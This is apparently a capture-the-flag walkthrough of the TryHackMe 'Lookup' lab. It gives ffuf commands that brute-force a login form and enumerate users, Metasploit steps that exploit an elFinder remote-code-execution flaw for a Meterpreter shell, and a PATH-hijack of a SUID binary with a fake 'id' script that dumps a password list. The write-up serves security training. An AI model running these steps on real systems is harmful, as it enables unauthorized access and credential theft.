So My attempt is to whenever I get the IP I always hit the IP in the browser after all basic stuff that I already mentioned in Instruction.txt file.

But doing so leads a redirect to http://lookup.thm.

So we need to do a small tweak in the file */etc/hosts*
Then where you entered the ip at the end of that ip put a single space then lookup.thm and save & exit.That's It.

Then i opened http://ip and it redirected me to http://lookup.thm then i saw a login page.

But i tried to do *Directory Enumuration* so i found directories are

```
200 -    1B  - /login.php
```

That's it i got.
so the page http://lookup.thm/login.php was a login page.

<login_page>

When viewing its source code:-

<source_code>

We can see the username and password parameter in the source code clearly.
Using this parameter We will hit a curl req with below command to test for valid req.

```
curl -v -X POST http://lookup.thm/login.thm -d "username=orion&password=1234"
```
```
Wrong username or password. Please try again.
Redirecting in 3 seconds.
```
The Req header in the curl were 
```
> POST /login.thm HTTP/1.1
> Host: lookup.thm
> User-Agent: curl/8.18.0
> Accept: */*
> Content-Length: 28
> Content-Type: application/x-www-form-urlencoded

```

And it was working it gave me the real wrong credentials error that i got in browser manual login too.

That means we can do req to login.thm in this way.

But without jumping to password bruteforcing i tried for sqli and it was not working.

Now finally that we are waiting for..

# Bruteforcing Login Page - Part - 1

 For this we are going to use ffuf.
 So we will do the below command to do enumuration to login page.
 But Before doing so we need to manually send 1 req first to get the response size and number of words in a invalid response.

so as according to curl output i did 
```
ffuf -u http://lookup.thm/login.php \
-w <(echo "random_user"):USER \
-w <(echo "random_pass"):PASS \
-X POST \
-d "username=USER&password=PASS" \
```

Now what i got as output was

``` 
[Status: 200, Size: 74, Words: 10, Lines: 1, Duration: 64ms]
    * PASS: random_pass
    * USER: random_user
```
<ffuf_image>
**so as according to curl output and Now we know that invalid response have response size 74 and response words 10**
```
ffuf -v  -u http://lookup.thm/login.php \
-w /home/Seclists/Usernames/top-usernames-shortlist.txt:USER \
-w /home/Seclists/Passwords/Common-Credentials/best15.txt:PASS \
-X POST \
-d "username=USER&password=PASS" \
-H "Content-Type: application/x-www-form-urlencoded" \
-fs 74 -fw 10 
```

Now we can see for admin the response was differ. So we tried with admin username in browser and the error was 

``` 
Wrong password. Please try again.
Redirecting in 3 seconds. 
```
See the error that we got from the curl at very top and the error that we are getting now has a difference that the error that we got now tells us that username is correct.
Meaning we have found 1 valid user. We will now user another wordlist.

```
ffuf -v  -u http://lookup.thm/login.php \
-w /home/Seclists/Usernames/Names/names.txt:USER \
-w /home/Seclists/Passwords/Common-Credentials/best15.txt:PASS \
-X POST \
-d "username=USER&password=PASS" \
-H "Content-Type: application/x-www-form-urlencoded" \
-fs 74 -fw 10
```
As you run it you will find another user.
```
[Status: 200, Size: 62, Words: 8, Lines: 1, Duration: 75ms]
| URL | http://lookup.thm/login.php
    * PASS: 111111
    * USER: admin

[Status: 200, Size: 62, Words: 8, Lines: 1, Duration: 63ms]
| URL | http://lookup.thm/login.php
    * PASS: 111111
    * USER: jose
```

So now we have a valid another username jose. 

now we will ffuf for same user but for passwords only for the username jose.
```
ffuf -v  -u http://lookup.thm/login.php \
-w /home/Seclists/Passwords/Common-Credentials/best1050.txt:PASS \
-X POST \
-d "username=jose&password=PASS" \
-H "Content-Type: application/x-www-form-urlencoded" \
-fs 62 -fw 8
```
Now you will get the password. Login there with credentials in the web.

You will now land us to http://files.lookup.thm/ but this is not in out /etc/hosts files so we add it too into out hosts file with the command

now after adding do enter credentials again and you land at the page http://files.lookup.thm/elFinder/elfinder.html#elf_l1_Lw.
Here you can see each file open and see it. after a lot of enumuration i was able to find the version of elfinder(The web file-manager that is being used here.)

And its version was vulnerable to rce. i got it after searching for that elfinder version number. so i used msfconsole to do this task.
to get the exploit just use the preinstalled kali tool searchsploit. by  the command searchsploit -c "elfinder with version number"
after getting the exploit.
Do start msfconsole by typing it into the terminal and when it starts do run "search <elfinder with version number>" then you will get a exploit path. Use the 4th one or one with excellent rating and path starts with /unix/webapp......... 

Then do "use <exploit_path>"
set the rhosts to files.lookup.thm by the command set RHOSTS files.lookup.thm
set the lhost to tun0 by the command set LHOST tun0
then enter the command run and hit enter. The exploit runs.
But i got the error.
<msf_error>
so to resolving steps were : -
Set the rhosts to room_ip by the command set RHOSTS <room_ip>
Next set the vhost to files.lookup.thm by the command set VHOST files.lookup.thm
and now hit the run you will get the Meterpreter session.
Meterpreter session is also similar to shell but we enter shell and get the shell.
We ran few command that we all ran when we get the shell. Command are whoami,id,
Now this shell is not full tty shell to make it fully tty shell we will use the below command to be comforable with shell
```
python3 -c "import pty; pty.spawn('/bin/bash')"
```
This will give us a fully tty bash shell.
# Privilege Escalation — Part 2
 Now we will start the hunt for current users in this system.

 As we all know this truth about the file /etc/passwd :-- The /etc/passwd file is a text database of user accounts on a Linux/Unix system.

When we did cat /etc/passwd. i got 
<users_image>
all entries follows this structure **username:password_placeholder:UID:GID:comment:home_directory:shell**
In the result we can see all system users except 2 *root* and *think*.
Now we have another user think whose uid & gid are 1000. It has also its home directory at /home/think lets gets in and see whats there.
<Enter_think>
see there is user.txt but we are currently logged in as www-data and that is owned by root and group think. so we can't read it for now.
But when we saw the hidden files with la  -a flag we can see there is a .password file under /home/think/.
<Password_think>

Next we will search for SUID binaries as they can gave us root access.
<SUID_binary>
We can see a unusual binary named /usr/sbin/pwm
When we execute this binary so it is trying to execute id and get the username out of it, if we could trick it to think that we are the user think we can see the content of /home/think/.passwords.
<Execute Binary>
If we are lucky enough that the binary is executing the command id without using the full path, we can add a modified script has the same name and append it’s path to the path variable. Lets try that
To do This we will make a file at the location  /tmp with filename id
To do so we need to first exit from shell and go the meterpreter session since meterpreter session doesn't have a option to create file.
So The current directory in which we opnened the msfconsole. we will create the id file there. the content within id files will be
#!/bin/bash
echo "uid=1001(think) gid=1001(think) groups=1001(think)"
then we save it on our local disk and upload it with the meterpreter command **upload id**
<Make_script>
Since Chmod is supported by meterpreter we will gave this id file executable permission.
Now make sure you are inside the tmp directory. Cuz we are going to executing a command that will add the current directory to the varible $PATH.
if you followed by steps and switched from meterpreter to shell i am pretty sure you are at the directory /var/www/files.lookup.thm/public_html/elFinder/php. switch to /tmp
The command is **PATH=/tmp:$PATH**
To make sure your Your path command succeed or not. Run echo $PATH if you get /tmp: at the beginning of the line your command is successfully executed.

Now Run that *SUID binary*
You should get a wordlist copy and save the wordlist for bruteforcing.
If you don't got the wordlist repeat the steps.
